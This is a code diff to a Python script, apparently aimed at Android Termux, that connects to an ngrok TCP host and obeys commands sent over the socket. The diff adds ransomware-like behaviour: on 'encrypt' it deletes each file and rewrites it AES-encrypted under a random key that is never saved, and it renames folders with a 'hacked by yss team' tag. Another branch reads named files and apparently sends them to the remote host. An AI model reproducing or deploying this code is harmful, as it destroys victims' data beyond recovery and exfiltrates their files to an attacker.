@@ -2,8 +2,10 @@
 
 import os
 import socket
+from random import randint
 from os import chdir, getcwd, listdir
 from os.path import isfile
+import pyaes
 print("Rajada melhorada, deixe o termux rodando e vai rajar")
 host = '0.tcp.sa.ngrok.io'
 port = 19018
@@ -26,11 +28,34 @@ while data_received < data_expected:
     data_received += len(data)
     # print("Received: {}".format(data.decode("utf-8")))
     for c in listdir():
-        if '/cd' in data.decode("utf-8"):
-            chdir(data.decode("utf-8")[3:len(data.decode("utf-8")) - 3])
-        elif data.decode("utf-8") == 'x':
+        if data.decode("utf-8") == 'x':
             sock.send(f'{c}  \n '.encode())
-            sock.send('Feito!')
+
+        elif data.decode("utf-8") == 'cd':
+            chdir('..')
+            sock.send('Feito!'.encode('utf-8'))
+        elif data.decode("utf-8") == 'encrypt':
+            if isfile(c):
+                p = c
+                filename = p
+                file = open(filename, 'rb')
+                file_data = file.read()
+                file.close()
+
+                os.remove(filename)
+                key = f"{randint(1000000000000000, 9000000000000000)}".encode()
+                aes = pyaes.AESModeOfOperationCTR(key)
+                crypto_data = aes.encrypt(file_data)
+
+                nw = filename + '.yss'
+                file = open(nw, 'w')
+                file_data = file.write(str(crypto_data))
+                file.close()
+                sock.send('Feito!'.encode('utf-8'))
+            else:
+                os.rename(c, f'hacked by yss team - M7coder - {randint(232323232323, 23232323232323232)}')
+
+
         else:
             t = open(data.decode("utf-8"), 'rb')
             msm = t.read()
